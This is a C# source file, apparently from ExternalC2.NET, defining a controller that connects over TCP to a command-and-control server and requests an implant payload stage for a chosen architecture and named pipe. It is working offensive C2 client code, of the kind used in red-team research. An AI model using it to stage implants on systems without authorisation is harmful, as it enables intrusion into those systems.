using System;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Threading.Tasks;

using ExternalC2.NET.Base;

namespace ExternalC2.NET.Controller
{
    public class SessionController : BaseConnector, ISessionController
    {
        protected override Stream Stream { get; set; }

        private IPAddress _server;
        private int _port;
        private int _block;

        public void Configure(IPAddress server, int port = 2222, int block = 100)
        {
            _server = server;
            _port = port;
            _block = block;
        }

        public async Task<bool> Connect()
        {
            var tcpClient = new TcpClient();
            await tcpClient.ConnectAsync(_server, _port);

            if (tcpClient.Connected)
                Stream = tcpClient.GetStream();

            return tcpClient.Connected;
        }

        public async Task<byte[]> RequestStage(string pipeName, Architecture arch)
        {
            switch (arch)
            {
                case Architecture.x86:
                    await WriteFrame(C2Frame.Generate("arch", "x86"));
                    break;
                
                case Architecture.x64:
                    await WriteFrame(C2Frame.Generate("arch", "x64"));
                    break;
                
                default:
                    throw new ArgumentOutOfRangeException(nameof(arch), arch, null);
            }

            await WriteFrame(C2Frame.Generate("pipename", pipeName));
            await WriteFrame(C2Frame.Generate("block", $"{_block}"));
            await WriteFrame(C2Frame.Generate("go"));

            var frame = await ReadFrame();
            return frame.Data;
        }

        public new async Task WriteFrame(C2Frame frame)
        {
            await base.WriteFrame(frame);
        }

        public new async Task<C2Frame> ReadFrame()
        {
            return await base.ReadFrame();
        }
    }
}